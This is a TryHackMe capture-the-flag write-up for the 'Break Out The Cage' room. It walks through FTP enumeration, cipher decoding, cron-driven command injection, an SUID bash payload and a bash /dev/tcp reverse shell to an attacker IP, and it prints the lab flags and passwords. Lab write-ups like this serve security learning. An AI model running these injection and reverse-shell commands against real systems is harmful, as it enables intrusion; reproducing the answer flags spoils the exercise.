# Break Out The Cage - TryHackMe Write-up

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Status](https://img.shields.io/badge/Status-Rooted-success)

## Machine Info

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **OS:** Linux (Ubuntu 18.04)
- **IP:** 10.65.174.209
- **Date Completed:** 21/03/2026
- **Time to Root:** ~26 hours (19-21/03/2026)

---

## Flags
```
User: THM{M37AL_0R_P3N_T35T1NG}
Root: THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
```

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -p- -T4 -oN nmap_initial.txt 10.65.174.209
```

**Results:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29
|_http-title: Nicholas Cage Stories
```

**Key findings:**
- FTP Anonymous login
- File `dad_tasks` discovered
- HTTP server (Nicolas Cage themed)

---

## Initial Access

### FTP Enumeration
```bash
ftp 10.65.174.209
# Username: anonymous
# Password: <enter>

ftp> ls
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks

ftp> get dad_tasks
ftp> exit
```

### Cipher Decryption (CRITICAL STEP)

**Challenge:** Double-encoded file
```bash
# Step 1: Base64 decode
cat dad_tasks | base64 -d > decoded.txt

# Output: Vigenère cipher text
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
```

**Step 2:** Vigenère Cipher
- Tool: https://www.dcode.fr/vigenere-cipher
- Key: **"cage"** (room theme!)
- Result: **Password discovered**
```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
...
In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

**Credentials obtained:**
```
Username: weston
Password: Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

### SSH Access
```bash
ssh weston@10.65.174.209
# Password: Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

✅ **Initial access as `weston`**

---

## Privilege Escalation: weston → cage

### Enumeration
```bash
# Find files owned by cage
find / -user cage 2>/dev/null
```

**Results:**
```
/home/cage
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files/.quotes
```

### Vulnerable Script Analysis
```bash
cat /opt/.dads_scripts/spread_the_quotes.py
```
```python
#!/usr/bin/env python
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)  # ← VULNERABLE!
```

**Vulnerability:** `os.system()` without quotes = **Command Injection**

### Exploitation

**Check permissions:**
```bash
ls -la /opt/.dads_scripts/.files/.quotes
# -rwxrw---- 1 cage cage (writable!)
```

**Payload injection:**

*Attempt 1: SUID bash (simpler)*
```bash
echo 'test;cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash' > /opt/.dads_scripts/.files/.quotes
# Wait for cron (broadcast every 3 min)
/tmp/rootbash -p
whoami  # cage
```

*Attempt 2: Reverse shell (used in final)*
```bash
# On Kali
nc -lvnp 9001

# On target
echo '; bash -c "bash -i >& /dev/tcp/10.64.116.209/9001 0>&1"' > /opt/.dads_scripts/.files/.quotes
```

**Why `bash -c` works:**
- Spawns new shell
- Protects special syntax (`>&`, `0>&1`)
- Prevents context breaking

✅ **Reverse shell as `cage` received!**

### User Flag
```bash
cat /home/cage/Super_Duper_Checklist
```
```
THM{M37AL_0R_P3N_T35T1NG}
```
---

## Privilege Escalation: cage → root

### Email Discovery
```bash
ls -la /home/cage/
# drwxrwxr-x 2 cage cage 4096 email_backup

cat /home/cage/email_backup/email_3
```

**Cipher string found:**
```
haiinspsyanileph
```

### Root Password Decryption

**Vigenère cipher (again!):**
- Ciphertext: `haiinspsyanileph`
- Key: **"face"** (Face/Off movie reference)
- Tool: https://www.dcode.fr/vigenere-cipher

**Result:**
```
cageisnotalegend
```

### Root Access
```bash
su root
# Password: cageisnotalegend

whoami  # root
```

### Root Flag
```bash
cat /root/email_backup/email_2
```
```
THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
```

✅ **ROOT OWNED!**

---

## Key Learnings

### Techniques Mastered

1. **Cipher Decifragem Sequencial**
   - Base64 → Vigenère
   - Key discovery via room theme

2. **Python Command Injection**
   - `os.system()` without quotes
   - `bash -c` for syntax protection

3. **Reverse Shell Execution**
   - Payload: `bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"`
   - Port selection (9001 worked vs 4444)

4. **VI Editor**
   - `gg` + `dG` (delete all)
   - `i` (insert mode)
   - `:wq` (save and quit)

5. **Cron Job Exploitation**
   - Writable file + automated script = privesc
   - Broadcast messages = cron indicator

### Challenges Faced

**🔴 Challenge 1: Double Cipher**
- Problem: Didn't know Base64 + Vigenère was possible
- Solution: Always try Base64 decode first, then identify remaining cipher

**🔴 Challenge 2: Command Injection Syntax**
- Problem: `; bash -i >& ...` failed
- Solution: Use `bash -c "bash -i >& ..."` to protect redirection syntax

**🔴 Challenge 3: Reverse Shell Port**
- Problem: Port 4444 didn't connect
- Solution: Try alternative ports (9001 worked)

---

## Tools Used

- `nmap` - Port scanning
- `ftp` - Anonymous login
- `base64` - Decoding
- [dcode.fr/vigenere-cipher](https://www.dcode.fr/vigenere-cipher) - Cipher decryption
- `ssh` - Remote access
- `find` - File enumeration
- `vi` - File editing
- `nc` (netcat) - Reverse shell listener
- `bash` - Shell scripting

---

## References

- [GTFOBins](https://gtfobins.github.io/)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [PentestMonkey Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Vigenère Cipher - dcode.fr](https://www.dcode.fr/vigenere-cipher)

---

## 🏆 Stats

- **Completion Time:** 26 hours (over 3 days)
- **Difficulty Rating:** Easy (but challenging for first timers)
- **Flags Captured:** 3/3
- **Techniques Learned:** 8 new

---

**Author:** UmbraNull (igorleite97)  
**Date:** 21/03/2026  
**Platform:** TryHackMe